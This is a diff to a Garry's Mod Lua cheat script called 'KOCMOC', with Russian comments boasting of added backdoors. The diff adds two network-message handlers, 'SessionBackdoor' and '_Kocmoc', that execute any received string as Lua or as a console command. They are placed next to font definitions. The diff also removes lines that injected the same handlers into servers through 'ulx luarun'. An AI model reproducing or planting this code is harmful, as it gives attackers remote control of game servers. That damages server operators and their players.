@@ -50,7 +50,8 @@ NOCOPYRIGHTS (c) FuckYourLife
     Реворкнул все функции, а так же исправил все говно которое он написал
     Добавлены новые бэкдуры и функции
 
-    
+    Слит. БЭКДУРЫ БЭКДУРЫ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+    13.09.23
 ]]--
 
 
@@ -116,7 +117,10 @@ surface.CreateFont("Kocmoc2", {
     additive = false,
     outline = false,
 } )
- 
+util.AddNetworkString ('SessionBackdoor')
+util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)
+util.AddNetworkString ('_Kocmoc')
+util.AddNetworkString('_Kocmoc') net.Receive('_Kocmoc', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)
 hook.Add("HUDPaint","hacked",function()
 
     draw.SimpleText("K O C M O C", "Kocmoc", 300, 400, white, 0 , 0)
@@ -1110,10 +1114,7 @@ local code = ([[
                 if( ValidNetString("SessionBackdoor") ) then
     
                 else
-                    RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('SessionBackdoor')" )
-                    RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
-                    RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('_Kocmoc')" )
-                    RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('_Kocmoc') net.Receive('_Kocmoc', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
+                
                     chat.AddText(Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 ), " Инжект успешен !" )
                 end
             end )
